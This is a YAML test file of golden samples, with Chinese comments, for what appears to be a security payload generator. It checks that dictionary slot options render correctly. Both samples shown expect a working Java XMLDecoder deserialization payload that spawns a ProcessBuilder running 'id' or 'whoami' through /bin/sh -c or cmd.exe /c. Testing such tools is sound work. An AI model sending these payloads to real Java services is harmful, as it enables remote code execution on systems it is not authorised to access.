# 字典槽位的**逐选项**黄金样本。
#
# 为什么单开一份：字符串槽位的选项是 `'` / `1` / `2` 这种短字面量，写错了肉眼能看出来；
# 字典槽位的每个选项却带一组字段（`{id: sh, shell: "/bin/sh", flag: "-c"}`），
# 打错一个字符（`-c` 写成 `-C`、`cmd.exe` 写成 `cmd.ex`、`utf-32` 写成 `utf32`）
# 产出的就是一条**语法合法、语义已错**的载荷，而没有任何测试会红。
#
# 已有的样本只走默认取值，非默认选项从没被真的渲染过。这里给每个字典槽位的
# **每一个选项**各写一条，state 里显式指定该选项，其余取默认。
#
# 期望值全部照着 data/ 里的 body 手推：槽位填充（`<<名.字段>>` → 字段值）
# → 变量替换（`<<变量>>` / `<<rep>>` / `<<select>>`）→ 输出渲染。
# 不透明的字面量（JWT 头段的 base64url、data:// 的 b64 代码）**独立解码核对过**，
# 不是从工具输出粘的。

ruleDB: v0.1.0

samples:
  # ================= deser.java.xmldecoder.process · sh =================
  # 槽位 sh 是一组「解释器 + 参数标志」的配套字段：`/bin/sh` 必须配 `-c`，
  # `cmd.exe` 必须配 `/c`。拆成两个独立槽位就能拼出 `cmd.exe -c`。

  - name: deser.java.xmldecoder.process · sh=sh
    state:
      vuln: deser
      component: java
      template: deser.java.xmldecoder.process
      slots: {sh: sh}
      vars: {cmd: id}
      outputs: [raw]
    expect:
      payload: |-
        <java version="1.8.0" class="java.beans.XMLDecoder">
         <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
           <void index="0"><string>/bin/sh</string></void>
           <void index="1"><string>-c</string></void>
           <void index="2"><string>id</string></void>
          </array>
          <void method="start"/>
         </object>
        </java>
      syntax: ok

  - name: deser.java.xmldecoder.process · sh=cmd
    state:
      vuln: deser
      component: java
      template: deser.java.xmldecoder.process
      slots: {sh: cmd}
      vars: {cmd: whoami}
      outputs: [raw]
    expect:
      # 换到 Windows 档：shell/flag 两个字段必须一起变，`cmd.exe -c` 是坏载荷
      payload: |-
        <java version="1.8.0" class="java.beans.XMLDecoder">
         <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
           <void index="0"><string>cmd.exe</string></void>
           <void index="1"><string>/c</string></void>
           <void index="2"><string>whoami</string></void>
          </array>
          <void method="start"/>
         </object>
        </java>
      syntax: ok

